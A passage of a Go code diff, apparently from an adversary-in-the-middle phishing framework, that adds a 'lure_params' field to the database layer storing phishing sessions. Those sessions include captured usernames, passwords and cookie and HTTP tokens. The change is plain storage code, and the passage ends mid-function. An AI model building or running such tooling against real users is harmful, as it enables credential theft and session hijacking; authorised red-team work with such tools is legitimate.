@@ -16,7 +16,7 @@ type Sessions struct{ db *DB }
 func NewSessionStore(db *DB) *Sessions { return &Sessions{db: db} }
 
 func (s *Sessions) CreateSession(session *aitm.Session) error {
-	custom, cookies, body, httpTok, err := marshalSessionFields(session)
+	custom, lureParams, cookies, body, httpTok, err := marshalSessionFields(session)
 	if err != nil {
 		return err
 	}
@@ -28,12 +28,12 @@ func (s *Sessions) CreateSession(session *aitm.Session) error {
 	_, err = s.db.db.Exec(`
 		INSERT INTO sessions
 			(id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
-			 bot_score, username, password, custom, cookie_tokens, body_tokens,
+			 bot_score, username, password, custom, lure_params, cookie_tokens, body_tokens,
 			 http_tokens, puppet_id, started_at, completed_at)
-		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
+		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
 		session.ID, session.Phishlet, session.LureID, session.RemoteAddr, session.UserAgent,
 		session.JA4Hash, session.BotScore, session.Username, session.Password,
-		custom, cookies, body, httpTok, session.PuppetID,
+		custom, lureParams, cookies, body, httpTok, session.PuppetID,
 		session.StartedAt.Unix(), completedAt,
 	)
 	if isConflict(err) {
@@ -45,7 +45,7 @@ func (s *Sessions) CreateSession(session *aitm.Session) error {
 func (s *Sessions) GetSession(id string) (*aitm.Session, error) {
 	row := s.db.db.QueryRow(`SELECT
 		id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
-		bot_score, username, password, custom, cookie_tokens, body_tokens,
+		bot_score, username, password, custom, lure_params, cookie_tokens, body_tokens,
 		http_tokens, puppet_id, started_at, completed_at
 		FROM sessions WHERE id = ?`, id)
 	sess, err := scanSession(row)
@@ -56,7 +56,7 @@ func (s *Sessions) GetSession(id string) (*aitm.Session, error) {
 }
 
 func (s *Sessions) UpdateSession(session *aitm.Session) error {
-	custom, cookies, body, httpTok, err := marshalSessionFields(session)
+	custom, lureParams, cookies, body, httpTok, err := marshalSessionFields(session)
 	if err != nil {
 		return err
 	}
@@ -68,12 +68,12 @@ func (s *Sessions) UpdateSession(session *aitm.Session) error {
 	res, err := s.db.db.Exec(`
 		UPDATE sessions SET
 			phishlet=?, lure_id=?, remote_addr=?, user_agent=?, ja4_hash=?,
-			bot_score=?, username=?, password=?, custom=?, cookie_tokens=?,
+			bot_score=?, username=?, password=?, custom=?, lure_params=?, cookie_tokens=?,
 			body_tokens=?, http_tokens=?, puppet_id=?, started_at=?, completed_at=?
 		WHERE id=?`,
 		session.Phishlet, session.LureID, session.RemoteAddr, session.UserAgent, session.JA4Hash,
 		session.BotScore, session.Username, session.Password,
-		custom, cookies, body, httpTok, session.PuppetID,
+		custom, lureParams, cookies, body, httpTok, session.PuppetID,
 		session.StartedAt.Unix(), completedAt, session.ID,
 	)
 	if err != nil {
@@ -97,7 +97,7 @@ func (s *Sessions) ListSessions(f aitm.SessionFilter) ([]*aitm.Session, error) {
 	clause, args := sessionWhereClause(f)
 
 	q := `SELECT id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
-		bot_score, username, password, custom, cookie_tokens, body_tokens,
+		bot_score, username, password, custom, lure_params, cookie_tokens, body_tokens,
 		http_tokens, puppet_id, started_at, completed_at FROM sessions` + clause + " ORDER BY started_at DESC"
 	if f.Limit > 0 {
 		q += fmt.Sprintf(" LIMIT %d", f.Limit)
@@ -180,6 +180,7 @@ func scanSession(row scanner) (*aitm.Session, error) {
 		startedAt   int64
 		completedAt *int64
 		custom      string
+		lureParams  string
 		cookies     string
 		body        string
 		httpTok     string
@@ -187,7 +188,7 @@ func scanSession(row scanner) (*aitm.Session, error) {
 	err := row.Scan(
 		&session.ID, &session.Phishlet, &session.LureID, &session.RemoteAddr, &session.UserAgent,
 		&session.JA4Hash, &session.BotScore, &session.Username, &session.Password,
-		&custom, &cookies, &body, &httpTok, &session.PuppetID,
+		&custom, &lureParams, &cookies, &body, &httpTok, &session.PuppetID,
 		&startedAt, &completedAt,
 	)
 	if err != nil {
@@ -198,33 +199,39 @@ func scanSession(row scanner) (*aitm.Session, error) {
 		t := time.Unix(*completedAt, 0)
 		session.CompletedAt = &t
 	}
-	if err := unmarshalSessionFields(&session, custom, cookies, body, httpTok); err != nil {
+	if err := unmarshalSessionFields(&session, custom, lureParams, cookies, body, httpTok); err != nil {
 		return nil, err
 	}
 	return &session, nil
 }
 
 // marshalSessionFields marshals the four JSON-serialized fields of a session.
-func marshalSessionFields(s *aitm.Session) (custom, cookies, body, httpTok string, err error) {
+func marshalSessionFields(s *aitm.Session) (custom, lureParams, cookies, body, httpTok string, err error) {
 	if custom, err = marshalJSON(s.Custom); err != nil {
-		return "", "", "", "", fmt.Errorf("marshaling custom fields for session %s: %w", s.ID, err)
+		return "", "", "", "", "", fmt.Errorf("marshaling custom fields for session %s: %w", s.ID, err)
+	}
+	if lureParams, err = marshalJSON(s.LureParams); err != nil {
+		return "", "", "", "", "", fmt.Errorf("marshaling lure params for session %s: %w", s.ID, err)
 	}
 	if cookies, err = marshalJSON(s.CookieTokens); err != nil {
-		return "", "", "", "", fmt.Errorf("marshaling cookie tokens for session %s: %w", s.ID, err)
+		return "", "", "", "", "", fmt.Errorf("marshaling cookie tokens for session %s: %w", s.ID, err)
 	}
 	if body, err = marshalJSON(s.BodyTokens); err != nil {
-		return "", "", "", "", fmt.Errorf("marshaling body tokens for session %s: %w", s.ID, err)
+		return "", "", "", "", "", fmt.Errorf("marshaling body tokens for session %s: %w", s.ID, err)
 	}
 	if httpTok, err = marshalJSON(s.HTTPTokens); err != nil {
-		return "", "", "", "", fmt.Errorf("marshaling http tokens for session %s: %w", s.ID, err)
+		return "", "", "", "", "", fmt.Errorf("marshaling http tokens for session %s: %w", s.ID, err)
 	}
 	return
 }
 
 // unmarshalSessionFields populates the four JSON-serialized fields of a session.
-func unmarshalSessionFields(s *aitm.Session, custom, cookies, body, httpTok string) error {
+func unmarshalSessionFields(s *aitm.Session, custom, lureParams, cookies, body, httpTok string) error {
 	if err := unmarshalJSON(custom, &s.Custom); err != nil {
 		return fmt.Errorf("unmarshaling custom fields for session %s: %w", s.ID, err)
+	}
+	if err := unmarshalJSON(lureParams, &s.LureParams); err != nil {
+		return fmt.Errorf("unmarshaling lure params for session %s: %w", s.ID, err)
 	}
 	if err := unmarshalJSON(cookies, &s.CookieTokens); err != nil {
 		return fmt.Errorf("unmarshaling cookie tokens for session %s: %w", s.ID, err)
